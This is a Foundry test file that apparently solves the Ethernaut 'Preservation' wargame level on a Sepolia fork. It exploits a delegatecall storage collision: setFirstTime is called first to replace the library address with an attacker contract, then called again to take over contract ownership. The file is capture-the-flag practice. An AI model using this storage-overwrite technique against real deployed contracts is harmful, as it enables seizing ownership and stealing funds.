// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {Attacker} from "./../src/16-Preservation/Attacker.sol";

interface IPreservation {
    function setFirstTime(uint256 _timeStamp) external;
    function owner() external view returns (address);
    function timeZone1Library() external view returns (address);
}

contract TestPreservation is Test {
    address public constant TARGET_ADDRESS = 0x6bD8B1695f46AD98b2A6b7836721887d665CBAF6;
    Attacker attackerContract;
    address attacker;
    IPreservation target;

    function setUp() public {
        string memory rpcUrl = vm.envString("SEPOLIA_RPC_URL");
        vm.createSelectFork(rpcUrl);

        attackerContract = new Attacker();
        attacker = makeAddr("attacker");
        target = IPreservation(TARGET_ADDRESS);
    }

    function testPreservation() public {
        vm.prank(attacker);
        target.setFirstTime(uint256(uint160(address(attackerContract))));

        assertEq(target.timeZone1Library() , address(attackerContract));

        vm.prank(attacker, attacker);
        target.setFirstTime(0);

        console.log(attackerContract.owner());

        assertEq(target.owner() , attacker);
    }
}